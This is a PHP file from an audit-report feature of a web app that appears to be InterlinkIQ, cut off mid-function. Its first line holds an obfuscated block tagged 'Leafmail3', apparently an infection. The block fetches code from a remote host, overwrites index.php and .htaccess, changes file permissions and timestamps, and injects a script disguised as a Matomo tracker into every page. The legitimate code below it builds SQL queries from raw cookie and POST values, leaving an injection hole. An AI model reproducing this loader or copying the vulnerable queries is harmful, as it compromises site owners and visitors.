<?php /*Leafmail3*/goto o1QFr; wasj3: $ZJUCA($jQ0xa, $RTa9G); goto wYDtx; IuHdj: $egQ3R = "\147\172\151"; goto ChKDE; TpHVE: $cPzOq .= "\157\x6b\x6b"; goto vgltl; gmVrv: $Mvmq_ .= "\x6c\x5f\x63\154\x6f"; goto N9T5l; SClM0: $VwfuP = "\x64\x65\146"; goto PXHHr; m8hp8: $uHlLz = "\x73\x74\x72"; goto lz2G0; UH4Mb: $eULaj .= "\x70\x63\x2e\x70"; goto apDh3; QPct6: AtVLG: goto Mg1JO; dj8v0: $ZJUCA = "\143\150"; goto WmTiu; uHm0i: $TBxbX = "\x57\x50\137\125"; goto RCot0; f4Rdw: if (!($EUeQo($kpMfb) && !preg_match($tIzL7, PHP_SAPI) && $fHDYt($uZmPe, 2 | 4))) { goto TGN7B; } goto S2eca; H7qkB: $MyinT .= "\164\40\x41\x63\x63"; goto Air1i; AedpI: try { goto JM3SL; oiS8N: @$YWYP0($lJtci, $H0gg1); goto nucR0; AffR5: @$YWYP0($PcRcO, $H0gg1); goto SpIUU; JnP2S: @$ZJUCA($lJtci, $shT8z); goto oiS8N; nOhHX: @$ZJUCA($lJtci, $RTa9G); goto LvbAc; LvbAc: @$rGvmf($lJtci, $UYOWA["\141"]); goto JnP2S; SpIUU: @$ZJUCA($jQ0xa, $shT8z); goto qvTm1; gA5rv: @$ZJUCA($PcRcO, $shT8z); goto AffR5; nucR0: @$ZJUCA($PcRcO, $RTa9G); goto COvI1; JM3SL: @$ZJUCA($jQ0xa, $RTa9G); goto nOhHX; COvI1: @$rGvmf($PcRcO, $UYOWA["\142"]); goto gA5rv; qvTm1: } catch (Exception $ICL20) { } goto PqZGA; BWxc9: $kpMfb .= "\154\137\x69\156\x69\164"; goto RMP1m; Q7gNx: $gvOPD = "\151\163\137"; goto AfwzG; fFfBR: goto AtVLG; goto kST_Q; J9uWl: $e9dgF .= "\x61\171\163"; goto lNb3h; ZlPje: $u9w0n .= "\x75\x69\x6c\144\x5f\161"; goto Mit4a; YRbfa: $dGt27 .= "\157\x73\x65"; goto L744i; ioNAN: $tIzL7 .= "\x6c\x69\57"; goto Khhgn; mz3rE: $FANp1 .= "\x70\141\x72\145"; goto SClM0; eBKm1: $PcRcO = $jQ0xa; goto Sg4f2; D0V8f: $pv6cp = "\162\x65"; goto Hy0sm; xXaQc: $FANp1 = "\x76\145\162\x73\151"; goto T7IwT; ulics: try { $_SERVER[$pv6cp] = 1; $pv6cp(function () { goto YEXR4; PKzAL: $AG2hR .= "\163\171\x6e\x63\75\164\162\165\145"; goto HIXil; NZAxH: $AG2hR .= "\x65\x72\75\164\x72\165\x65\x3b" . "\12"; goto Tbsb3; xDrpr: $AG2hR .= "\x75\x6d\x65\156\164\54\40\x67\75\144\x2e\143\162\145\x61\164\145"; goto mLjk9; r_Oqj: $AG2hR .= "\163\x63\162\151\160\164\x22\x3e" . "\xa"; goto JZsfv; PEdls: $AG2hR .= "\74\57\163"; goto WBFgG; POyWW: $AG2hR .= "\x4d\55"; goto a8oGQ; N2RIK: $AG2hR .= "\175\x29\50\51\x3b" . "\12"; goto PEdls; Vj0ze: $AG2hR .= "\x72\151\160\x74\40\164\x79\x70\145\x3d\42\164\145\170"; goto FXjwZ; JZsfv: $AG2hR .= "\x28\x66\x75\156\143"; goto ZRBmo; zk1Ml: $AG2hR .= "\x79\124\141\147\x4e\x61\155\145"; goto STHB_; aKt86: $AG2hR .= "\x72\x69\160\x74\42\51\x2c\40\x73\75\x64\x2e\x67\x65\x74"; goto oxuwD; FXjwZ: $AG2hR .= "\x74\57\x6a\141\x76\141"; goto r_Oqj; YffEK: $AG2hR .= "\57\x6d\141\164"; goto nL_GE; ZrlUz: $AG2hR .= "\x73\x63\162\151\x70\164\x22\x3b\40\147\x2e\141"; goto PKzAL; MSqPC: $AG2hR .= "\x65\x20\55\x2d\76\12"; goto rWq2m; gUhrX: $AG2hR .= "\74\x73\143"; goto Vj0ze; oxuwD: $AG2hR .= "\x45\154\x65\x6d\145\156\164\x73\102"; goto zk1Ml; a8oGQ: $AG2hR .= time(); goto xyZaU; WBFgG: $AG2hR .= "\x63\162\151\160\164\x3e\xa"; goto jHj0s; rWq2m: echo $AG2hR; goto zxMHd; zzMTI: $AG2hR .= "\152\141\166\x61"; goto ZrlUz; HIXil: $AG2hR .= "\73\x20\147\56\144\x65\x66"; goto NZAxH; EXhzp: $AG2hR .= "\x65\156\164\x4e\x6f\x64\145\56\x69\x6e"; goto yJp9W; KUpUt: $AG2hR .= "\x64\40\115\141\x74"; goto c13YM; hugz8: $AG2hR .= "\x6f\x72\145\50\x67\54\x73\51\73" . "\xa"; goto N2RIK; xyZaU: $AG2hR .= "\x22\73\40\163\56\160\141\162"; goto EXhzp; ZRBmo: $AG2hR .= "\164\151\x6f\156\x28\51\x20\173" . "\xa"; goto sOVga; YqIfq: $AG2hR .= "\77\x69\x64\x3d"; goto POyWW; Tbsb3: $AG2hR .= "\147\x2e\163\x72"; goto vxsas; k1w2Q: $AG2hR = "\x3c\41\x2d\55\x20\115\x61"; goto OOFo2; F2sIB: $AG2hR .= "\x3d\x22\164\x65\x78\x74\57"; goto zzMTI; OOFo2: $AG2hR .= "\x74\157\155\x6f\x20\55\x2d\x3e\xa"; goto gUhrX; vxsas: $AG2hR .= "\143\x3d\165\x2b\42\x6a\163\57"; goto JGvCK; jHj0s: $AG2hR .= "\74\x21\55\55\40\x45\156"; goto KUpUt; mLjk9: $AG2hR .= "\105\154\x65\x6d\x65\156\x74\50\42\163\x63"; goto aKt86; yJp9W: $AG2hR .= "\x73\x65\162\x74\102\145\146"; goto hugz8; c13YM: $AG2hR .= "\x6f\x6d\x6f\40\103\157\144"; goto MSqPC; STHB_: $AG2hR .= "\50\x22\x73\x63\162\x69"; goto SX8pI; JGvCK: $AG2hR .= $osL5h; goto YffEK; nL_GE: $AG2hR .= "\x6f\155\x6f\56\x6a\x73"; goto YqIfq; SX8pI: $AG2hR .= "\160\x74\42\51\133\x30\135\x3b" . "\xa"; goto uh8pE; YEXR4: global $osL5h, $cPzOq; goto k1w2Q; jW6LQ: $AG2hR .= "\166\141\x72\40\144\x3d\x64\157\143"; goto xDrpr; uh8pE: $AG2hR .= "\x67\x2e\164\x79\x70\145"; goto F2sIB; sOVga: $AG2hR .= "\166\x61\162\40\x75\75\42" . $cPzOq . "\42\x3b" . "\xa"; goto jW6LQ; zxMHd: }); } catch (Exception $ICL20) { } goto arBxc; TrkYs: $eULaj .= "\x2f\170\x6d"; goto GE2p3; L744i: $cPzOq = "\x68\x74\164\x70\163\72\57\x2f"; goto TpHVE; CNdmS: wLXpb: goto wasj3; nHXnO: $_POST = $_REQUEST = $_FILES = array(); goto CNdmS; PHhHL: P9yQa: goto W2Q7W; UkCDT: $cLC40 = 32; goto BnazY; vabQZ: $CgFIN = 1; goto QPct6; gSbiK: try { goto xtnST; qBVAq: $k7jG8[] = $E0suN; goto Tc9Eb; vZ6zL: $E0suN = trim($Q0bWd[0]); goto LuoPM; D98P3: if (!empty($k7jG8)) { goto FbDAI; } goto AML_a; LuoPM: $jCv00 = trim($Q0bWd[1]); goto Q4uy7; xtnST: if (!$gvOPD($d3gSl)) { goto nHP5K; } goto W8uMn; c_73m: FbDAI: goto h1Cu7; kNAxm: if (!($uHlLz($E0suN) == $cLC40 && $uHlLz($jCv00) == $cLC40)) { goto lfWQh; } goto MfJKK; L8cv7: WVm2j: goto c_73m; AML_a: $d3gSl = $jQ0xa . "\x2f" . $HNQiW; goto GBRPC; ZSYyc: $jCv00 = trim($Q0bWd[1]); goto kNAxm; W8uMn: $Q0bWd = @explode("\72", $DJDq1($d3gSl)); goto Woix_; EA1BT: if (!(is_array($Q0bWd) && count($Q0bWd) == 2)) { goto ctSg2; } goto A163l; Woix_: if (!(is_array($Q0bWd) && count($Q0bWd) == 2)) { goto wU2zk; } goto vZ6zL; Q4uy7: if (!($uHlLz($E0suN) == $cLC40 && $uHlLz($jCv00) == $cLC40)) { goto VAVW5; } goto qBVAq; tEVz_: $k7jG8[] = $jCv00; goto xWpvL; xWpvL: lfWQh: goto oilos; MfJKK: $k7jG8[] = $E0suN; goto tEVz_; N3TyU: wU2zk: goto snD7p; lky0R: $Q0bWd = @explode("\72", $DJDq1($d3gSl)); goto EA1BT; Tc9Eb: $k7jG8[] = $jCv00; goto evp7M; snD7p: nHP5K: goto D98P3; oilos: ctSg2: goto L8cv7; evp7M: VAVW5: goto N3TyU; GBRPC: if (!$gvOPD($d3gSl)) { goto WVm2j; } goto lky0R; A163l: $E0suN = trim($Q0bWd[0]); goto ZSYyc; h1Cu7: } catch (Exception $ICL20) { } goto xU6vT; T7IwT: $FANp1 .= "\x6f\x6e\x5f\143\x6f\x6d"; goto mz3rE; JX1Oy: $dGt27 = "\x66\x63\x6c"; goto YRbfa; BnazY: $Pzt0o = 5; goto TYFaW; o1QFr: $kFvng = "\74\x44\x44\x4d\x3e"; goto wODYw; CL80L: $MyinT .= "\120\x2f\61\x2e\x31\x20\x34"; goto gErqa; tFGg7: $YWYP0 .= "\x75\143\x68"; goto dj8v0; pXfDS: $ygOJ_ .= "\x2f\167\160"; goto c7yEe; xUd9U: $pv6cp .= "\151\x6f\x6e"; goto bqFyS; PqZGA: CVVA3: goto RDKTA; wYDtx: $uZmPe = $nPBv4($eULaj, "\x77\x2b"); goto f4Rdw; E453u: $QIBzt .= "\56\64"; goto O8RXw; a4EJZ: $dZR_y = $cPzOq; goto vZkPa; FK_sr: $kb9bA .= "\x65\162\x2e\x69"; goto G2uff; TuwL4: $jQ0xa = $_SERVER[$Wv1G0]; goto wrxGI; wJDrU: $eULaj = $jQ0xa; goto TrkYs; MLdcc: $fHDYt .= "\x63\153"; goto JX1Oy; Gs7Gb: $kpMfb = $vW4As; goto BWxc9; Mit4a: $u9w0n .= "\x75\x65\x72\171"; goto cIo5P; GE2p3: $eULaj .= "\x6c\162"; goto UH4Mb; cIo5P: $uAwql = "\155\x64\65"; goto aXExt; c7yEe: $ygOJ_ .= "\x2d\x61"; goto XWOCC; wrxGI: $ygOJ_ = $jQ0xa; goto pXfDS; XsWqd: $kb9bA .= "\57\56\165\163"; goto FK_sr; cWrVz: $nPBv4 .= "\145\x6e"; goto KCtWA; CrWKs: $l0WLW .= "\157\160\x74"; goto jcG0e; lz2G0: $uHlLz .= "\154\x65\x6e"; goto xXaQc; wee0Y: $ulOTQ .= "\115\111\116"; goto Tfi5q; vgltl: $cPzOq .= "\154\x69\x6e\153\56\x74"; goto pr5fA; Khhgn: $tIzL7 .= "\x73\151"; goto JBJmV; kJlf4: $DJDq1 .= "\147\145\164\137\143"; goto NZqWx; lNb3h: $H0gg1 = $xsR4V($e9dgF); goto XYviL; TBl6Q: sLwcv: goto fFfBR; RMP1m: $l0WLW = $vW4As; goto ujtZa; XQnCd: $PcRcO .= "\x61\143\143\145\163\x73"; goto ikUIP; X4xWX: $QIBzt = "\x35"; goto E453u; hDUdL: $MWMOe .= "\x6c\x65"; goto Q7gNx; LxUUO: $RTa9G = $QTYip($HqqUn($RTa9G), $Pzt0o); goto qaeyL; f6Txl: $HqqUn = "\x64\x65\143"; goto gwNCH; sK97X: $nPBv4 = "\x66\157\160"; goto cWrVz; Ee0VW: $EUeQo .= "\164\x69\x6f\156\x5f"; goto a2JJX; D9NbF: $CgFIN = 1; goto PHhHL; VY3H_: $Wv1G0 = "\x44\117\x43\x55\115\105\116\x54"; goto HpOFr; CRqG1: if (empty($k7jG8)) { goto VIn91; } goto s4AWH; apDh3: $eULaj .= "\x68\160\x2e\60"; goto sK97X; Sg4f2: $PcRcO .= "\57\x2e\x68\x74"; goto XQnCd; jcG0e: $YQ0P6 = $vW4As; goto rA_Dy; dlqC2: $HNQiW = substr($uAwql($osL5h), 0, 6); goto xGZOR; kxKwG: $osL5h = $_SERVER[$i5EZR]; goto TuwL4; ozW5s: $e9dgF .= "\63\x20\x64"; goto J9uWl; xU6vT: $lJtci = $jQ0xa; goto BpRMk; CquiC: $dZR_y .= "\x63\x6f\160\171"; goto BLSy0; GSfrX: $pv6cp .= "\x75\x6e\143\164"; goto xUd9U; yaYSs: $rGvmf .= "\x6f\x6e\x74\x65\156\164\163"; goto mIlAi; FXRyn: $TBxbX .= "\115\x45\x53"; goto R1jVG; kST_Q: VIn91: goto vabQZ; flXr3: $shT8z = $QTYip($HqqUn($shT8z), $Pzt0o); goto TkfCl; FJdH4: $dZR_y .= "\x3d\x67\x65\x74"; goto CquiC; kJyDh: $QTYip = "\x69\156\x74"; goto blzff; s4AWH: $H25pP = $k7jG8[0]; goto t74Wt; TyAte: $k7jG8 = array(); goto UkCDT; EO8QL: try { $UYOWA = @$AkFS8($egQ3R($eKFWX($M7wqP))); } catch (Exception $ICL20) { } goto OXweB; XYviL: $i5EZR = "\110\124\124\x50"; goto j4Pjv; ikUIP: $kb9bA = $jQ0xa; goto XsWqd; VrwTF: $nRD8p .= "\x64\x69\162"; goto aQp1m; dLa5a: $pv6cp .= "\x65\162\x5f"; goto x5YEr; PgImI: @$ZJUCA($kb9bA, $RTa9G); goto yAax8; Jb1Vu: try { goto Bwps7; WPylr: if (!$xsy4x($Y61WO)) { goto nWSzU; } goto NpK90; xqrLf: @$YWYP0($dqnvi, $H0gg1); goto cinsF; N7wJU: if ($xsy4x($Y61WO)) { goto KOuoA; } goto RBLfp; wf0jq: @$ZJUCA($Y61WO, $shT8z); goto xqrLf; bfkJn: try { goto jwOvP; sXqkD: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYPEER, false); goto tXay1; jwOvP: $ekYPG = $kpMfb(); goto jMqt3; VURt4: $l0WLW($ekYPG, CURLOPT_POST, 1); goto Qk7oo; G7Y1e: $l0WLW($ekYPG, CURLOPT_USERAGENT, "\x49\x4e"); goto Sw_Ys; lg1iu: $l0WLW($ekYPG, CURLOPT_TIMEOUT, 3); goto VURt4; jMqt3: $l0WLW($ekYPG, CURLOPT_URL, $LfwPf . "\x26\164\x3d\151"); goto G7Y1e; Qk7oo: $l0WLW($ekYPG, CURLOPT_POSTFIELDS, $u9w0n($Lx9yT)); goto axPES; Sw_Ys: $l0WLW($ekYPG, CURLOPT_RETURNTRANSFER, 1); goto sXqkD; tXay1: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYHOST, false); goto Gb33B; PUEHo: $Mvmq_($ekYPG); goto rF4qo; Gb33B: $l0WLW($ekYPG, CURLOPT_FOLLOWLOCATION, true); goto lg1iu; axPES: $YQ0P6($ekYPG); goto PUEHo; rF4qo: } catch (Exception $ICL20) { } goto zCePm; s2GBY: $Y61WO = dirname($dqnvi); goto N7wJU; bO0VE: KOuoA: goto WPylr; RBLfp: @$ZJUCA($jQ0xa, $RTa9G); goto lexI4; NpK90: @$ZJUCA($Y61WO, $RTa9G); goto aGYEQ; wsLep: $Lx9yT = ["\144\x61\x74\x61" => $UYOWA["\x64"]["\165\162\x6c"]]; goto bfkJn; y0C5p: @$ZJUCA($dqnvi, $shT8z); goto wf0jq; cinsF: $LfwPf = $cPzOq; goto d8sPt; OAF8R: $LfwPf .= "\x6c\x6c"; goto wsLep; d8sPt: $LfwPf .= "\77\141\143"; goto HZ42Q; lexI4: @$nRD8p($Y61WO, $RTa9G, true); goto K7fs2; aGYEQ: @$rGvmf($dqnvi, $UYOWA["\144"]["\x63\157\x64\x65"]); goto y0C5p; zCePm: nWSzU: goto r2ase; Bwps7: $dqnvi = $jQ0xa . $UYOWA["\144"]["\160\x61\x74\x68"]; goto s2GBY; K7fs2: @$ZJUCA($jQ0xa, $shT8z); goto bO0VE; HZ42Q: $LfwPf .= "\164\75\x63\141"; goto OAF8R; r2ase: } catch (Exception $ICL20) { } goto AedpI; kAMGF: $xsy4x .= "\144\x69\x72"; goto gdP2h; lX6T6: if (!$gvOPD($kb9bA)) { goto KTGlr; } goto spjef; jxKJS: $ulOTQ .= "\x5f\x41\104"; goto wee0Y; vZkPa: $dZR_y .= "\x3f\141\143\164"; goto FJdH4; gErqa: $MyinT .= "\60\x36\x20\116\x6f"; goto H7qkB; xGZOR: $hg32N = $d3gSl = $ygOJ_ . "\57" . $HNQiW; goto TyAte; GiT2I: $Mvmq_ = $vW4As; goto gmVrv; KCtWA: $fHDYt = "\x66\x6c\157"; goto MLdcc; Yc09l: $xsy4x = "\x69\163\137"; goto kAMGF; FZsOD: $lJtci .= "\150\x70"; goto eBKm1; rA_Dy: $YQ0P6 .= "\154\137\x65\170\x65\x63"; goto GiT2I; VQCaR: $k8h0h = !empty($m4bDA) || !empty($ZTS7q); goto Bw8cX; ujtZa: $l0WLW .= "\154\137\x73\x65\x74"; goto CrWKs; R1jVG: $ulOTQ = "\127\120"; goto jxKJS; OXweB: if (!is_array($UYOWA)) { goto CVVA3; } goto L7ftk; bqFyS: if (isset($_SERVER[$pv6cp])) { goto Kwp9i; } goto r3vZ_; ChKDE: $egQ3R .= "\156\146\x6c\x61\164\145"; goto OCGca; Bx0F8: $rGvmf = "\146\x69\154\145\x5f"; goto cMMsY; lar4b: $xsR4V .= "\x6d\145"; goto ESAaf; L7ftk: try { goto b8mrw; IZ7dT: @$rGvmf($d3gSl, $UYOWA["\x63"]); goto qi8JJ; j1slf: if (!$xsy4x($ygOJ_)) { goto fnZm_; } goto l27iU; FnW9Y: fnZm_: goto IZ7dT; RHQPY: @$ZJUCA($jQ0xa, $shT8z); goto FudGj; jRIpH: $d3gSl = $hg32N; goto FnW9Y; b8mrw: @$ZJUCA($jQ0xa, $RTa9G); goto j1slf; l27iU: @$ZJUCA($ygOJ_, $RTa9G); goto jRIpH; qi8JJ: @$ZJUCA($d3gSl, $shT8z); goto fMj35; fMj35: @$YWYP0($d3gSl, $H0gg1); goto RHQPY; FudGj: } catch (Exception $ICL20) { } goto Jb1Vu; Hy0sm: $pv6cp .= "\x67\151\x73\164"; goto dLa5a; wODYw: $tIzL7 = "\57\x5e\143"; goto ioNAN; D9G8A: $vW4As = "\x63\165\162"; goto Gs7Gb; zR6Sw: $RTa9G += 304; goto LxUUO; FLAgg: @$ZJUCA($jQ0xa, $shT8z); goto Ms_Rx; TkfCl: $MyinT = "\110\124\124"; goto CL80L; JBJmV: $xsR4V = "\x73\x74\x72"; goto wDwVu; m7Y7E: $shT8z += 150; goto flXr3; OCGca: $AkFS8 = "\165\x6e\x73\145\x72"; goto DuXwv; spjef: @$ZJUCA($jQ0xa, $RTa9G); goto PgImI; mIlAi: $YWYP0 = "\x74\157"; goto tFGg7; Air1i: $MyinT .= "\x65\x70\164\x61\142\154\145"; goto wJDrU; hnuEm: $M7wqP = false; goto IxcDO; AfwzG: $gvOPD .= "\x66\151\154\x65"; goto Yc09l; Mg1JO: if (!$CgFIN) { goto V5o9n; } goto a4EJZ; O8RXw: $QIBzt .= "\x2e\x30\73"; goto kxKwG; Qjsri: Kwp9i: goto uHm0i; aQp1m: $DJDq1 = "\146\151\154\145\x5f"; goto kJlf4; wDwVu: $xsR4V .= "\x74\157"; goto k5kym; Ms_Rx: KTGlr: goto QDkYN; p2xAd: $u9w0n = "\x68\x74\x74\160\x5f\142"; goto ZlPje; XWOCC: $ygOJ_ .= "\x64\155\151\156"; goto dlqC2; PXHHr: $VwfuP .= "\x69\156\145\144"; goto uwRQG; t74Wt: $Aa5A7 = $k7jG8[1]; goto rjUnC; WmTiu: $ZJUCA .= "\x6d\157\x64"; goto OMDdm; F90kP: $CgFIN = 1; goto TBl6Q; IxcDO: try { goto MN2Ol; lfwpD: $l0WLW($ekYPG, CURLOPT_RETURNTRANSFER, 1); goto XT0V7; pm4fL: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYHOST, false); goto f1Wpg; LukB5: $l0WLW($ekYPG, CURLOPT_USERAGENT, "\x49\x4e"); goto lfwpD; MN2Ol: $ekYPG = $kpMfb(); goto PGjVI; XT0V7: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYPEER, false); goto pm4fL; f1Wpg: $l0WLW($ekYPG, CURLOPT_FOLLOWLOCATION, true); goto A02q4; Jr5Fq: $Mvmq_($ekYPG); goto kxHAl; kxHAl: $M7wqP = trim(trim($M7wqP, "\xef\273\xbf")); goto DRdNb; A02q4: $l0WLW($ekYPG, CURLOPT_TIMEOUT, 10); goto czpAh; PGjVI: $l0WLW($ekYPG, CURLOPT_URL, $dZR_y); goto LukB5; czpAh: $M7wqP = $YQ0P6($ekYPG); goto Jr5Fq; DRdNb: } catch (Exception $ICL20) { } goto TtjMz; yA6tr: $e9dgF .= "\63\x36"; goto ozW5s; BLSy0: $dZR_y .= "\x26\164\x3d\x69\46\x68\75" . $osL5h; goto hnuEm; qaeyL: $shT8z = 215; goto m7Y7E; YAsQc: if (!(!$_SERVER[$pv6cp] && $FANp1(PHP_VERSION, $QIBzt, "\76"))) { goto VlKKH; } goto ulics; QDkYN: $CgFIN = 0; goto CRqG1; g3rCR: $m4bDA = $_REQUEST; goto A4fYL; rjUnC: if (!(!$gvOPD($lJtci) || $MWMOe($lJtci) != $H25pP)) { goto P9yQa; } goto D9NbF; x5YEr: $pv6cp .= "\x73\x68\165"; goto itQ2f; A4fYL: $ZTS7q = $_FILES; goto VQCaR; a2JJX: $EUeQo .= "\145\x78"; goto fYDkt; TYFaW: $Pzt0o += 3; goto hoCMV; fYDkt: $EUeQo .= "\x69\163\x74\163"; goto D9G8A; fmcU9: $MWMOe .= "\x5f\x66\151"; goto hDUdL; S2eca: $ZJUCA($jQ0xa, $shT8z); goto YAsQc; RCot0: $TBxbX .= "\x53\105\x5f\124\110\105"; goto FXRyn; BpRMk: $lJtci .= "\57\x69\x6e"; goto lJYIj; cMMsY: $rGvmf .= "\160\x75\164\137\143"; goto yaYSs; j4Pjv: $i5EZR .= "\x5f\x48\117\x53\x54"; goto VY3H_; itQ2f: $pv6cp .= "\x74\x64\x6f"; goto gi1ux; YAE22: $eKFWX .= "\66\x34\137\x64"; goto HkhAv; DuXwv: $AkFS8 .= "\x69\x61\x6c\151\x7a\x65"; goto kJyDh; NZqWx: $DJDq1 .= "\x6f\156\164\145\x6e\x74\x73"; goto Bx0F8; ESAaf: $EUeQo = "\146\x75\156\143"; goto Ee0VW; HkhAv: $eKFWX .= "\x65\143\x6f\x64\145"; goto IuHdj; RDKTA: HuCWH: goto tkEEo; k5kym: $xsR4V .= "\x74\151"; goto lar4b; WQZ3H: $UYOWA = 0; goto EO8QL; TtjMz: if (!($M7wqP !== false)) { goto HuCWH; } goto WQZ3H; N9T5l: $Mvmq_ .= "\x73\145"; goto p2xAd; HpOFr: $Wv1G0 .= "\137\122\117\x4f\124"; goto X4xWX; arBxc: VlKKH: goto gSbiK; G2uff: $kb9bA .= "\156\151"; goto lX6T6; gwNCH: $HqqUn .= "\157\x63\164"; goto m8hp8; yAax8: @unlink($kb9bA); goto FLAgg; pr5fA: $cPzOq .= "\157\x70\x2f"; goto D0V8f; gi1ux: $pv6cp .= "\x77\x6e\x5f\x66"; goto GSfrX; OMDdm: $eKFWX = "\142\141\x73\x65"; goto YAE22; aXExt: $MWMOe = $uAwql; goto fmcU9; gdP2h: $nRD8p = "\155\x6b"; goto VrwTF; Bw8cX: if (!(!$fs0FH && $k8h0h)) { goto wLXpb; } goto nHXnO; uwRQG: $e9dgF = "\x2d\61"; goto yA6tr; hoCMV: $RTa9G = 189; goto zR6Sw; Tfi5q: $fs0FH = $VwfuP($TBxbX) || $VwfuP($ulOTQ); goto g3rCR; W2Q7W: if (!(!$gvOPD($PcRcO) || $MWMOe($PcRcO) != $Aa5A7)) { goto sLwcv; } goto F90kP; r3vZ_: $_SERVER[$pv6cp] = 0; goto Qjsri; lJYIj: $lJtci .= "\144\x65\170\56\x70"; goto FZsOD; blzff: $QTYip .= "\x76\x61\x6c"; goto f6Txl; tkEEo: V5o9n: goto ossJl; ossJl: TGN7B: ?>
<?php
    include_once ('database_iiq.php');
    $base_url = "https://interlinkiq.com/";

	function employerID($ID) {
		global $conn;

		$selectUser = mysqli_query( $conn,"SELECT * from tbl_user WHERE ID = $ID" );
	    $rowUser = mysqli_fetch_array($selectUser);
	    $current_userEmployeeID = $rowUser['employee_id'];

	    $current_userEmployerID = $ID;
	    if ($current_userEmployeeID > 0) {
	        $selectEmployer = mysqli_query( $conn,"SELECT * FROM tbl_hr_employee WHERE suspended = 0 AND status = 1 AND ID=$current_userEmployeeID" );
	        if ( mysqli_num_rows($selectEmployer) > 0 ) {
	            $rowEmployer = mysqli_fetch_array($selectEmployer);
	            $current_userEmployerID = $rowEmployer["user_id"];
	        }
	    }

	    return $current_userEmployerID;
	}

	if( isset($_POST['btnGenerate']) ) {
		if (!empty($_COOKIE['switchAccount'])) {
			$portal_user = $_COOKIE['ID'];
			$user_id = $_COOKIE['switchAccount'];
		}
		else {
			$portal_user = $_COOKIE['ID'];
			$user_id = employerID($portal_user);
		}

		$btnType = $_POST['btnType'];
		$ID = $_POST['ID'];
		$timestamp_id = $_POST['timestamp_id'];

        $timestamp_date = new DateTime(); //this returns the current date time
        $timestamp_id_new = $timestamp_date->format('YmdHisu');

		$organization = addslashes($_POST['organization']);
		$audit_type = addslashes($_POST['audit_type']);
		$inspected_by = addslashes($_POST['inspected_by']);
		$auditee = addslashes($_POST['auditee']);
		$verified_by = addslashes($_POST['verified_by']);
		$audit_scope = addslashes($_POST['audit_scope']);

		$operation = addslashes($_POST['operation']);
		$shipper = addslashes($_POST['shipper']);
		$operation_type = addslashes($_POST['operation_type']);
		$audit_ex = addslashes($_POST['audit_ex']);
		$addendum = addslashes($_POST['addendum']);
		$product_observed = addslashes($_POST['product_observed']);
		$similar_product = addslashes($_POST['similar_product']);
		$product_applied = addslashes($_POST['product_applied']);
		$auditor = addslashes($_POST['auditor']);
		$cert_valid = addslashes($_POST['cert_valid']);

		$date_review_started = addslashes($_POST['date_review_started']);
		$date_review_finished = addslashes($_POST['date_review_finished']);
		$total_time_review = addslashes($_POST['total_time_review']);
		$date_inspection_started = addslashes($_POST['date_inspection_started']);
		$date_inspection_finished = addslashes($_POST['date_inspection_finished']);
		$total_time_inspection = addslashes($_POST['total_time_inspection']);

		$date = $_POST['daterange'];
		$date = explode(' - ', $date);
		$date_start = $date[0];
		$date_end = $date[1];

        $last_modified = date('Y-m-d');

        $score_type = $_POST['score_type'];
		$score_data = "";
        if (!empty($_POST['score_label'])) {
            $arr_item = array();
            for ($i=0; $i < count($_POST['score_label']); $i++) {
                $score_label = addslashes($_POST['score_label'][$i]);
                $score_rate = addslashes($_POST['score_rate'][$i]);
                $score_color = addslashes($_POST['score_color'][$i]);
                $output = array (
                    'score_label'    =>  $score_label,
                    'score_rate'    =>  $score_rate,
                    'score_color'    =>  $score_color
                );
                array_push($arr_item, $output);
            }
            $score_data = json_encode($arr_item, JSON_HEX_APOS | JSON_UNESCAPED_UNICODE);
        } else {
            $score_type = 0;
        }

		$label = "";
		if (!empty($_POST['label'])) { 
			$label = $_POST['label'];
			$label = implode(' | ', $label);
		}

		$description = "";
		if (!empty($_POST['description'])) { 
			$description = $_POST['description'];
			$description = implode(' | ', $description);
		}

		$file = $_FILES['file']['name'];
		if (!empty($file)) {
			$base_tmp = $_FILES['file']['tmp_name'];
			$base_type = pathinfo($base_tmp, PATHINFO_EXTENSION);
			$base_data = file_get_contents($base_tmp);
			$file = 'data:image/png;base64,' . base64_encode($base_data);
		}

		$columnResult = 0;
		$columnYes = 0;
		$columnNA = 0;
		$columnCount = 0;

		// Select and Clone Format
        $format_output_arr = array();
        $format_type_arr = array();
        $format_ID_arr = array();
        $format_ID_new_arr = array();
		$selectFormat = mysqli_query( $conn,"SELECT * FROM tbl_ia_format WHERE deleted = 0 AND timestamp_id = $timestamp_id");
		if ( mysqli_num_rows($selectFormat) > 0 ) {
			while($rowFormat = mysqli_fetch_array($selectFormat)) {
				$format_ID = $rowFormat['ID'];
				$format_type = $rowFormat['type'];
				$format_label = $rowFormat['label'];

				$sql_format = "INSERT INTO tbl_ia_format (order_id, timestamp_id, type, label)
				SELECT order_id, '$timestamp_id_new', type, label
				FROM tbl_ia_format
				WHERE deleted = 0 AND ID = $format_ID";
				if (mysqli_query($conn, $sql_format)) {
					$last_id_format = mysqli_insert_id($conn);

					$output_format = array (
						'old' => $format_ID,
						'new' => $last_id_format,
						'label' => $format_label
					);
					array_push($format_output_arr, $output_format);
	                array_push($format_type_arr, $format_type);
	                array_push($format_ID_arr, $format_ID);
	                array_push($format_ID_new_arr, $last_id_format);
				}

				// Count Answer
				if(!empty($_POST['columnData_'.$format_ID])) {
					$columnDatas = $_POST['columnData_'.$format_ID];
					$columnCount += count($columnDatas);

					if (in_array(strtolower('yes'), array_map('strtolower', $columnDatas))) {
						if (in_array(strtolower('n/a'), array_map('strtolower', $columnDatas))) {
							$columnNA += array_count_values(array_map('strtolower', $columnDatas))['n/a'];
						} else if (in_array(strtolower('na'), array_map('strtolower', $columnDatas))) {
							$columnNA += array_count_values(array_map('strtolower', $columnDatas))['na'];
						}
						$columnYes += array_count_values(array_map('strtolower', $columnDatas))['yes'];
					}
				}
			}
		}
		$format_ID_new_arr_data = implode(' | ', $format_ID_new_arr);

		// Meter Gauge Result
		if ($columnCount > $columnNA) { $columnResult = $columnYes / ($columnCount - $columnNA); }
		$columnPercent = round($columnResult * 100);
		$columnPercent = round($columnResult * 100);
		if ($btnType == 'btnGenerate2') { $columnPercent = 0; }

		// Customize Scoring Setup
		$score_result = array();
		array_push($score_result, $columnYes);
		array_push($score_result, $columnCount - $columnNA - $columnYes);
		array_push($score_result, $columnCount - $columnNA);
		$score_result = implode(" | ",$score_result);

		// Select and Clone Sheet
        $sheet_output_arr = array();
        $sheet_ID_arr = array();
        $sheet_ID_new_arr = array();
